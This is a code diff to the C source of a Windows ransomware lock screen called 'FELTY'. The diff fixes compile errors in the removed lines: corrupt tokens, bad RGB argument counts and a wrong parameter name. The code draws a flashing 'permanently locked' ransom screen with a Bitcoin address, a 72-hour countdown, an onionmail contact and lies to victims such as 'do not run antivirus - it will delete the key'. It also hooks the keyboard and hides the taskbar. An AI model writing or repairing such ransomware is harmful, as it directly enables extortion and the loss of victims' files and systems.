@@ -45,8 +45,8 @@ static HFONT   g_font_huge  = NULL;
 static HFONT   g_font_mono  = NULL;
 static UINT_PTR g_timer_repaint = 0;
 static UINT_PTR g_timer_flash   = 0;
-static int     g_flash_state = 0Ca;
-static int     g_matrix_init = 0;
+static int     g_flash_state    = 0;
+static int     g_matrix_init    = 0;
 
 /* ─── FELTY ASCII LOGO (from HTML) ─── */
 static const char *g_logo[] = {
@@ -101,7 +101,7 @@ static void draw_permanent_lock(HDC hdc, int sw, int sh)
     g_flash_state = !g_flash_state;
     COLORREF bg = g_flash_state ? RGB(0, 0, 0) : RGB(26, 0, 0);
     COLORREF tc = g_flash_state ? RGB(255, 51, 51) : RGB(255, 255, 255);
-    COLORREF tc2 = g_flash_state ? RGB(255, 68, 68) : RGB(200, 100, 100apsed);
+    COLORREF tc2 = g_flash_state ? RGB(255, 68, 68) : RGB(200, 100, 100);
     COLORREF tc3 = g_flash_state ? RGB(255, 136, 136) : RGB(180, 180, 180);
 
     HBRUSH fbg = CreateSolidBrush(bg);
@@ -140,7 +140,7 @@ static void draw_permanent_lock(HDC hdc, int sw, int sh)
     TextOutW(hdc, sw / 2 - 180, sh / 2 + 110, L"NOTHING CAN SAVE YOUR FILES NOW.", 33);
 
     SelectObject(hdc, g_font_small);
-    SetTextColor(hdc, RGB(255, 68, 68, 70));
+    SetTextColor(hdc, RGB(255, 68, 68));
     TextOutW(hdc, sw / 2 - 200, sh / 2 + 150, L"[ THIS SYSTEM IS PERMANENTLY LOCKED ]", 38);
 
     if (!g_timer_flash) {
@@ -206,7 +206,7 @@ static void draw_normal_screen(HDC hdc, int sw, int sh)
     cy += 40;
 
     /* ═══ PASSWORD PROMPT ═══ */
-    HPEN pw = CreatePen(PS_SOLID, 1, RGB(204, 0, 0, 68));
+    HPEN pw = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
     SelectObject(hdc, pw);
     Rectangle(hdc, cx, cy, cx + box_w - 50, cy + 40);
     DeleteObject(pw);
@@ -230,7 +230,7 @@ static void draw_normal_screen(HDC hdc, int sw, int sh)
     int panel_w = (box_w - 80) / 2;
     int panel_y = cy;
 
-    HPEN pp = CreatePen(PS_SOLID, 1, RGB(204, 0, 0, 51));
+    HPEN pp = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
     SelectObject(hdc, pp);
 
     /* Left panel — System Status */
@@ -265,8 +265,8 @@ static void draw_normal_screen(HDC hdc, int sw, int sh)
     SelectObject(hdc, g_font_small);
     SetTextColor(hdc, RGB(255, 136, 51));
     TextOutW(hdc, p2x + 10, panel_y + 72, L"1FELTYa1zP1eP5QGefi2DMPTfTL5SLmv7", 37);
-    SetTextColor(hdc, RGB(255, 68, 68, 70));
-    TextOutW(hdc, p2x + 10, panel_y + 100, L"BTC ADDRESS", 11hed);
+    SetTextColor(hdc, RGB(255, 68, 68));
+    TextOutW(hdc, p2x + 10, panel_y + 100, L"BTC ADDRESS", 11);
     TextOutW(hdc, p2x + panel_w - 70, panel_y + 100, L"72:00:00", 8);
 
     DeleteObject(pp);
@@ -274,15 +274,15 @@ static void draw_normal_screen(HDC hdc, int sw, int sh)
     cy = panel_y + 145;
 
     /* ═══ WARNINGS ═══ */
-    HPEN wp = CreatePen(PS_SOLID, 1, RGB(204, 0, 0, 51));
+    HPEN wp = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
     SelectObject(hdc, wp);
     Rectangle(hdc, cx, cy, cx + box_w - 50, cy + 105);
-    DeleteObject(wp(auto);
+    DeleteObject(wp);
 
     SelectObject(hdc, g_font_small);
     SetTextColor(hdc, RGB(255, 0, 0));
     TextOutW(hdc, cx + 15, cy + 10, L">> DO NOT ATTEMPT TO DECRYPT FILES YOURSELF", 44);
-    SetTextColor(hdc, RGB(255, 68, 68, 80));
+    SetTextColor(hdc, RGB(255, 68, 68));
     TextOutW(hdc, cx + 15, cy + 30, L">> DO NOT RUN ANTIVIRUS - IT WILL DELETE THE KEY", 49);
     TextOutW(hdc, cx + 15, cy + 50, L">> DO NOT SHUT DOWN OR RESTART YOUR COMPUTER", 46);
     TextOutW(hdc, cx + 15, cy + 70, L">> ONLY FELTY DECRYPTION TOOL CAN RESTORE FILES", 48);
@@ -290,7 +290,7 @@ static void draw_normal_screen(HDC hdc, int sw, int sh)
     cy += 115;
 
     /* ═══ CONTACT ═══ */
-    SetTextColor(hdc, RGB(255, 68, 68, 80));
+    SetTextColor(hdc, RGB(255, 68, 68));
     TextOutW(hdc, cx + 20, cy, L"CONTACT:  feltyhelp@onionmail.org", 34);
     SetTextColor(hdc, RGB(255, 136, 51));
     wchar_t mid[64];
@@ -391,7 +391,7 @@ static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
         break;
     }
     case WM_TIMER: {
-        if (wParam == 1) {
+        if (w == 1) {
             /* Repaint timer for matrix rain animation */
             InvalidateRect(hwnd, NULL, FALSE);
         }
@@ -523,7 +523,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
     /* Cleanup */
     if (g_timer_repaint) KillTimer(g_hwnd, g_timer_repaint);
     if (g_timer_flash) KillTimer(g_hwnd, g_timer_flash);
-    if (g_kb_hook) UnhookWindowsHookEx(g_kb_hookuck);
+    if (g_kb_hook) UnhookWindowsHookEx(g_kb_hook);
 
     /* Restore taskbar */
     HWND hTaskBar = FindWindowW(L"Shell_TrayWnd", NULL);
